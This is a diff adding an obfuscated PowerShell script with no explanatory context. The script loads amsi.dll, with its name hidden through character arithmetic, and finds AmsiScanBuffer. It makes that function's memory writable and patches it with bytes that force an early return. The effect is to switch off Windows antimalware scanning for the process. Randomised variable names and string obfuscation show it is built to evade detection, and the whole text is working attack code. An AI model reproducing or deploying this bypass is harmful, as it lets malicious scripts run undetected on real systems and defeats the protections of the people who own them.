@@ -1,0 +1,27 @@
+$pohby = @"
+using System;
+using System.Runtime.InteropServices;
+public class pohby {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr ikqxhp, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+
+Add-Type $pohby
+
+$imtgqps = [pohby]::LoadLibrary("$(('âmsì.'+'dll').nOrmaLize([chAr](70*32/32)+[CHaR]([BytE]0x6f)+[ChAR]([BYTe]0x72)+[CHAR]([byTe]0x6d)+[CHAR](68*23/23)) -replace [CHAR](92*65/65)+[ChAR](70+42)+[cHAR](16+107)+[chAr]([BytE]0x4d)+[Char](110+33-33)+[ChaR]([ByTE]0x7d))")
+$unrfrt = [pohby]::GetProcAddress($imtgqps, "$([char](60+5)+[CHar](40+69)+[chaR]([bYte]0x73)+[CHaR]([BYTE]0x69)+[chAR]([byTe]0x53)+[char]([bYte]0x63)+[ChAr](8+89)+[ChAR](110)+[chaR]([BYtE]0x42)+[Char](117)+[chAR]([BYtE]0x66)+[char](29+73)+[cHAr](101+87-87)+[cHaR](76+38))")
+$p = 0
+[pohby]::VirtualProtect($unrfrt, [uint32]5, 0x40, [ref]$p)
+$qbko = "0xB8"
+$fyhp = "0x57"
+$udif = "0x00"
+$zjaq = "0x07"
+$egob = "0x80"
+$zytf = "0xC3"
+$wgptx = [Byte[]] ($qbko,$fyhp,$udif,$zjaq,+$egob,+$zytf)
+[System.Runtime.InteropServices.Marshal]::Copy($wgptx, 0, $unrfrt, 6)
